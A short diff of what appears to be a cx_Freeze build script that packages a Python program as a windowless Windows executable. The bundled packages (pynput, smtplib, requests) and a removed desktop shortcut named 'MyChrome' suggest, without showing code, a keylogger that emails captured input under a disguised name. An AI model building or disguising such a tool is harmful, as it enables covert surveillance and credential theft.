@@ -8,10 +8,9 @@ if (sys.platform == "win32"):
     base = "Win32GUI"
 
 includefiles = ['test.bat']
-executables = [Executable("main.py", base=base, icon="icon2.ico", shortcutName="MyChrome",
-            shortcutDir="DesktopFolder",)]
+executables = [Executable("main.py", base=base, icon="icon2.ico")]
 
-packages = ["idna", "pynput", "threading", "smtplib", "oc", "requests"]
+packages = ["idna", "pynput", "threading", "smtplib", "oc", "requests", "scipy"]
 options = {
     'build_exe': {
         'packages': packages, 'include_files':includefiles
